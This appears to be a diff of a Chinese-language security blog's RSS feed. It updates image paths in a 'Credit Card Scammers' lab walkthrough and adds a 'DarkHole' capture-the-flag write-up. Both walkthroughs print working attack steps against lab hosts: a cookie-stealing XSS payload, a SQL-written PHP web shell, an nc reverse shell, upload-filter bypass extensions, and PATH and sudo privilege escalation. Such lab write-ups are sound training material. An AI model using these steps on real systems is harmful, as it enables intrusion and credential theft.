@@ -927,28 +927,28 @@ Use &#34;--help [option]&#34; to view documentation for a given option
 sudo nmap --min-rate 10000 -p- 10.10.10.31
 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31
 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="aaa.png" alt="aaa.png"&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/aaa.png" alt="aaa.png"&gt;&lt;/p&gt;
 &lt;h2 id="gobuster-爆破目录"&gt;gobuster 爆破目录&lt;/h2&gt;
 &lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="bbb.png" alt="bbb.png"&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png" alt="bbb.png"&gt;&lt;/p&gt;
 &lt;h1 id="web-渗透"&gt;Web 渗透&lt;/h1&gt;
 &lt;p&gt;审计爆破的目录发现在 admin 下有一个登入界面&lt;/p&gt;
-&lt;p&gt;&lt;img src="ccc.png" alt="ccc.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ccc.png" alt="ccc.png"&gt;&lt;/p&gt;
 &lt;p&gt;默认界面能找到提交表单&lt;/p&gt;
-&lt;p&gt;&lt;img src="ddd.png" alt="ddd.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ddd.png" alt="ddd.png"&gt;&lt;/p&gt;
 &lt;p&gt;尝试 XSS&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script&amp;gt;new Image().src=&amp;#34;http://10.10.10.5/?c=&amp;#34;+document.cookie;&amp;lt;/script&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ee.png" alt="ee.png"&gt;&lt;/p&gt;
 &lt;p&gt;kali 架设连接&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;python3 -m http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="fff.png" alt="fff.png"&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/fff.png" alt="fff.png"&gt;&lt;/p&gt;
 &lt;p&gt;修改 cookie 登入&lt;/p&gt;
-&lt;p&gt;&lt;img src="ggg.png" alt="ggg.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ggg.png" alt="ggg.png"&gt;&lt;/p&gt;
 &lt;p&gt;注入 sql 反弹 shell&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;SELECT &amp;#34;&amp;lt;?php passthru($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34; INTO DUMPFILE &amp;#39;/var/www/html/shell.php&amp;#39;
 &lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;http://10.10.10.33/shell.php?cmd=pwd
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="hhh.png" alt="hhh.png"&gt;&lt;/p&gt;</description><content type="html"><![CDATA[<blockquote>
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/hhh.png" alt="hhh.png"&gt;&lt;/p&gt;</description><content type="html"><![CDATA[<blockquote>
 <p>此文章以 kali 地址为 10.10.10.5 为示例</p>
 </blockquote>
 <h1 id="credit-card-scammers-靶场">Credit Card Scammers 靶场</h1>
@@ -961,28 +961,28 @@ sudo nmap --min-rate 10000 -p- 10.10.10.31
 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 
 
 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 
-</code></pre><p><img src="aaa.png" alt="aaa.png"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/aaa.png" alt="aaa.png"></p>
 <h2 id="gobuster-爆破目录">gobuster 爆破目录</h2>
 <p>在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破</p>
 <pre tabindex="0"><code>sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
-</code></pre><p><img src="bbb.png" alt="bbb.png"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png" alt="bbb.png"></p>
 <h1 id="web-渗透">Web 渗透</h1>
 <p>审计爆破的目录发现在 admin 下有一个登入界面</p>
-<p><img src="ccc.png" alt="ccc.png"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/ccc.png" alt="ccc.png"></p>
 <p>默认界面能找到提交表单</p>
-<p><img src="ddd.png" alt="ddd.png"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/ddd.png" alt="ddd.png"></p>
 <p>尝试 XSS</p>
 <pre tabindex="0"><code>&lt;script&gt;new Image().src=&#34;http://10.10.10.5/?c=&#34;+document.cookie;&lt;/script&gt;
 </code></pre><p><img src="ee.png" alt="ee.png"></p>
 <p>kali 架设连接</p>
 <pre tabindex="0"><code>python3 -m http.server 80
-</code></pre><p><img src="fff.png" alt="fff.png"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/fff.png" alt="fff.png"></p>
 <p>修改 cookie 登入</p>
-<p><img src="ggg.png" alt="ggg.png"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/ggg.png" alt="ggg.png"></p>
 <p>注入 sql 反弹 shell</p>
 <pre tabindex="0"><code>SELECT &#34;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&#34; INTO DUMPFILE &#39;/var/www/html/shell.php&#39;
 </code></pre><pre tabindex="0"><code>http://10.10.10.33/shell.php?cmd=pwd
-</code></pre><p><img src="hhh.png" alt="hhh.png"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/hhh.png" alt="hhh.png"></p>
 <p>连接 shell ，因为防火墙墙掉了不常见端口，因此使用 443 端口</p>
 <pre tabindex="0"><code>nc -e /bin/bash 10.10.10.5 4444
 </code></pre><p>以下是提权一阶段代码</p>
@@ -993,13 +993,13 @@ cd settings
 ls
 
 cat config.php
-</code></pre><p><img src="iii.png" alt="iii"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/iii.png" alt="iii"></p>
 <pre tabindex="0"><code>mysql -uorders -pOb2UA15ubBtzpZrvdMYT orders -e &#39;SELECT * from users;&#39; 
-</code></pre><p><img src="jjj.png" alt="jjj"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/jjj.png" alt="jjj"></p>
 <p>john 破解</p>
-<p><img src="kkk.png" alt="kkk"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/kkk.png" alt="kkk"></p>
 <p>ssh 登入</p>
-<p><img src="lll.png" alt="lll"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/lll.png" alt="lll"></p>
 <p>二阶段提权</p>
 <pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
 
@@ -1018,6 +1018,179 @@ echo &#39;/bin/bash&#39; &gt; tar
 chmod 777 tar
 
 /usr/bin/backup
-</code></pre><p><img src="mmm.png" alt="mmm"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/mmm.png" alt="mmm"></p>
 <p>拿下机器</p>
+]]></content></item><item><title>DarkHole Writeup</title><link>https://enilmalus.github.io/posts/darkhole-writeup/</link><pubDate>Sat, 10 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/darkhole-writeup/</guid><description>&lt;blockquote&gt;
+&lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id="darkhole-靶场"&gt;DarkHole 靶场&lt;/h1&gt;
+&lt;h2 id="主机发现"&gt;主机发现&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="aaa.png" alt="aaa"&gt;&lt;/p&gt;
+&lt;p&gt;靶机的主机为 10.10.10.9&lt;/p&gt;
+&lt;h2 id="服务识别"&gt;服务识别&lt;/h2&gt;
+&lt;p&gt;使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试&lt;/p&gt;
+&lt;p&gt;扫描开放的端口&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --min-rate 10000 -p- 10.10.10.9
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="bbb.png" alt="bbb"&gt;&lt;/p&gt;
+&lt;p&gt;扫描开放端口的基本信息，并将结果保存到本地以便于随时观看&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sT -sC -sV -p22,80 10.10.10.9 -oA nmap/Scan
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ccc.png" alt="ccc"&gt;&lt;/p&gt;
+&lt;p&gt;使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --script=vuln -p22,80 10.10.10.9 -oA nmap/Script
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ddd.png" alt="ddd"&gt;&lt;/p&gt;
+&lt;p&gt;发现暴露出了很多目录，执行一下完整的目录爆破&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u /usr/share/dirb/wordlists/common.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="eeee.png" alt="eeee"&gt;&lt;/p&gt;
+&lt;p&gt;除了 index.php 其他都是文件目录，
+upload 可能是文件上传的目录&lt;/p&gt;
+&lt;p&gt;&lt;img src="fff.png" alt="fff"&gt;&lt;/p&gt;
+&lt;h2 id="web渗透"&gt;WEB渗透&lt;/h2&gt;
+&lt;h3 id="80-端口渗透"&gt;80 端口渗透&lt;/h3&gt;
+&lt;p&gt;打开 80 页面&lt;/p&gt;
+&lt;p&gt;&lt;img src="ggg.png" alt="ggg"&gt;&lt;/p&gt;
+&lt;p&gt;View Details 点击没反应，
+进入 Login 页面&lt;/p&gt;</description><content type="html"><![CDATA[<blockquote>
+<p>此文章以 kali 地址为 10.10.10.5 为示例</p>
+</blockquote>
+<h1 id="darkhole-靶场">DarkHole 靶场</h1>
+<h2 id="主机发现">主机发现</h2>
+<pre tabindex="0"><code>sudo nmap -sn 10.10.10.0/24
+</code></pre><p><img src="aaa.png" alt="aaa"></p>
+<p>靶机的主机为 10.10.10.9</p>
+<h2 id="服务识别">服务识别</h2>
+<p>使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试</p>
+<p>扫描开放的端口</p>
+<pre tabindex="0"><code>sudo nmap --min-rate 10000 -p- 10.10.10.9
+</code></pre><p><img src="bbb.png" alt="bbb"></p>
+<p>扫描开放端口的基本信息，并将结果保存到本地以便于随时观看</p>
+<pre tabindex="0"><code>sudo nmap -sT -sC -sV -p22,80 10.10.10.9 -oA nmap/Scan
+</code></pre><p><img src="ccc.png" alt="ccc"></p>
+<p>使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地</p>
+<pre tabindex="0"><code>sudo nmap --script=vuln -p22,80 10.10.10.9 -oA nmap/Script
+</code></pre><p><img src="ddd.png" alt="ddd"></p>
+<p>发现暴露出了很多目录，执行一下完整的目录爆破</p>
+<pre tabindex="0"><code>sudo gobuster dir -u /usr/share/dirb/wordlists/common.txt 
+</code></pre><p><img src="eeee.png" alt="eeee"></p>
+<p>除了 index.php 其他都是文件目录，
+upload 可能是文件上传的目录</p>
+<p><img src="fff.png" alt="fff"></p>
+<h2 id="web渗透">WEB渗透</h2>
+<h3 id="80-端口渗透">80 端口渗透</h3>
+<p>打开 80 页面</p>
+<p><img src="ggg.png" alt="ggg"></p>
+<p>View Details 点击没反应，
+进入 Login 页面</p>
+<p><img src="hhh.png" alt="hhh"></p>
+<p>尝试一下弱密码和万能密码没成功，
+点击下方 Sign up now 注册一个账号试试</p>
+<p><img src="iii.png" alt="iii"></p>
+<p>如图随便输入注册一个账号试试</p>
+<pre tabindex="0"><code>admin12345
+admin12345@gmail
+admin12345
+</code></pre><p>进入后台</p>
+<p><img src="jjj.png" alt="jjj"></p>
+<h3 id="越权">越权</h3>
+<p>通过尝试发现这个界面实现的是更新功能，
+可以更新 Detalis 和 Password，
+提交一个新的 Password 的同时抓包分析一下</p>
+<p><img src="kkk.png" alt="kkk"></p>
+<p>发现 id 处是 3 ，
+可能存在越权漏洞，
+猜测后台根据注册顺序来赋予 id，
+id=1 或 0 极有可能是 root 或 拥有 root 权限
+先将 id 修改为 1 试试，
+提交</p>
+<p>提示我们 Password 已改变（没截到图）</p>
+<p>那我们就切换账号试试看</p>
+<p><img src="lll.png" alt="lll"></p>
+<p>分别尝试一下 root 和 admin，
+果然，admin 登入成功了</p>
+<p><img src="mmm.png" alt="mmm"></p>
+<p>看见有一个文件上传点，
+上传一个 php 后门试试</p>
+<p><img src="nnn.png" alt="nnn"></p>
+<p>提示只能上传 jpg , png , gif 格式的文件，
+尝试使用罕见的后缀名上传文件，
+以下是可能的 后缀名</p>
+<pre tabindex="0"><code>.php
+.php3
+.php4
+.php5
+.php7
+
+# Less known PHP extensions
+.pht
+.phps
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.inc
+</code></pre><p>在尝试后，
+最终上传了一个 phtml 的文件是可以执行的，
+使用的是 kali 自带的 payload，
+可以在 /upload 中查看</p>
+<p><img src="ooo.png" alt="ooo"></p>
+<h2 id="linux-提权">Linux 提权</h2>
+<p>kali 建立 nc 监听</p>
+<pre tabindex="0"><code>sudo nc -lvnp 4444
+</code></pre><p>执行 payload 获得回显</p>
+<p><img src="ppp.png" alt="ppp"></p>
+<p>使用 python3 获得更好的 shell 环境</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><p>基本枚举查看信息</p>
+<p><img src="qqq.png" alt="qqq"></p>
+<p>在前面目录爆破的时候看到 config 目录下有一个 php 文件，搜索出来看一下</p>
+<p><img src="rrr.png" alt="rrr"></p>
+<pre tabindex="0"><code>find / -name database.php
+</code></pre><p><img src="sss.png" alt="sss"></p>
+<pre tabindex="0"><code>cd /var/www/html/config/
+ls
+cat database.php
+</code></pre><p><img src="ttt.png" alt="ttt"></p>
+<p>说明了 john 和 darkhole 两个用户可能有价值</p>
+<p>查看一下 shadow 或者 passwd 的执行权限，
+shadow 没有任何权限，passwd 有读取的权限，</p>
+<pre tabindex="0"><code>ls -liah /etc/passwd
+</code></pre><p><img src="P2.png" alt="P2"></p>
+<p>读取一下，提取出拥有 /bin/bash 的用户</p>
+<pre tabindex="0"><code>cat /etc/passwd | grep &#34;/bin/bash&#34;
+</code></pre><p><img src="P2.png" alt="P2"></p>
+<p>查看具有 s 位的可执行文件</p>
+<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><p>发现 john 拥有一个具有 s 位的 可执行文件</p>
+<p><img src="P4.png" alt="P4"></p>
+<p>运行一下看看</p>
+<p><img src="P5.png" alt="P5"></p>
+<p>尝试一下在执行 toto 之前塞一个 /bin/bash 到环境变量切换到 john 用户</p>
+<pre tabindex="0"><code>echo &#34;/bin/bash&#34; &gt; /tmp/cdt
+chmod 777 /tmp/cdt
+echo $PATH
+export PATH=/tmp:$PATH
+echo $PATH
+/home/john/toto
+</code></pre><p>成功切换</p>
+<p><img src="P7.png" alt="P7"></p>
+<p>进入 john 用户文件夹</p>
+<pre tabindex="0"><code>cd ../../../../../../../home/john
+</code></pre><p><img src="P8.png" alt="P8"></p>
+<p>查看一下 password 文件</p>
+<p><img src="P9.png" alt="P9"></p>
+<p>john 的密码是 root123，
+查看一下sudo -l</p>
+<p><img src="P10.png" alt="P10"></p>
+<p>发现可以免密执行 sudo 的 python3 和 file.py</p>
+<p>塞一个切换 bash 的命令 给 file.py 实现提权</p>
+<pre tabindex="0"><code>echo &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34; &gt; file.py
+cat file.py
+sudo python3 /home/john/file.py
+</code></pre><p>拿下机器</p>
+<p><img src="P11.png" alt="P11"></p>
+<h2 id="总结">总结</h2>
+<p>这台靶机的难度中等偏下，
+文件上传的时候需要一些经验和尝试，
+linux 提权的时候要了解 suid 环境变量提权</p>
 ]]></content></item></channel></rss>
